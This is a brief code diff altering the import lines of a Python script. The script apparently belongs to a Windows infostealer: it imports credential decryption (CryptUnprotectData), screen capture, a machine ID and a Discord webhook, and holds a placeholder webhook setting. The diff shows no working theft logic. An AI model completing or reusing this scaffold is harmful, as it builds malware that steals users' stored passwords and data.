@@ -9,7 +9,7 @@ import getpass
 import ctypes
 import traceback
 
-from util.injection import Injection
+from cryptography.fernet import Fernet
 from discord import SyncWebhook
 from PIL import ImageGrab
 from random import choice
@@ -19,7 +19,7 @@ from uuid import getnode
 from win32crypt import CryptUnprotectData
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
-from util.screenshot import screenshot
+
 
 class VARIABLES:
     webhook    = "webhookhere"
